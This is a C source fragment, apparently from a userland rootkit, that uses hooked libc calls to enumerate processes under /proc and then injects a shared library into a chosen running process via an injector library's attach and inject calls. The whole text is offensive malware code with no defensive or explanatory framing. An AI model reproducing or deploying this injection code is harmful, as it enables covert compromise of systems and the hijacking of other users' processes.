unsigned int npids(DIR *dp){
    unsigned int pids = 0;
    struct dirent *dir;
    FILE *fp;

    hook(CREADDIR, CFOPEN);

    while((dir = call(CREADDIR, dp)) != NULL){
        if(dir->d_name[0] == '.')
            continue;
        char tmp[13+strlen(dir->d_name)];
        xsnprintf(tmp, sizeof(tmp)-1, MAPS_PATH_FMT_STRING, dir->d_name);
        fp = call(CFOPEN, tmp, "r");
        if(fp == NULL) continue;
        fclose(fp);
        ++pids;
    }
    rewinddir(dp);

    return pids;
}

pid_t *allpids(unsigned int *a){
    pid_t *pids;
    unsigned int count, i=0;
    DIR *dp;
    struct dirent *dir;
    FILE *fp;

    hook(COPENDIR, CREADDIR, CFOPEN);

    dp = call(COPENDIR, "/proc");
    if(dp == NULL) return NULL;

    count = npids(dp);
    if(!count){
        closedir(dp);
        return NULL;
    }
    pids = calloc(count, sizeof(pid_t));
    if(!pids){
        closedir(dp);
        return NULL;
    }

    while((dir = readdir(dp)) != NULL && i<count){
        if(dir->d_name[0] == '.')
            continue;

        char tmp[13+strlen(dir->d_name)];
        xsnprintf(tmp, sizeof(tmp)-1, MAPS_PATH_FMT_STRING, dir->d_name);

        fp = call(CFOPEN, tmp, "r");
        if(fp == NULL) continue;
        fclose(fp);
        
        pids[i++] = (pid_t)atoi(dir->d_name);
    }
    closedir(dp);

    *a = i;
    return pids;
}

int binject(pid_t pid, const char *target){
    int attach, inject;
    injector_t *injector;
    void *bandle;

    bandle = dlopen(target, RTLD_LAZY);
    if(bandle == NULL)
        return -1;
    else dlclose(bandle);

    attach = injector_attach(&injector, pid);
    if(attach != 0) return attach;

    inject = injector_inject(injector, target, NULL);
    if(inject != 0) return inject;

    injector_detach(injector);
    return 1;
}
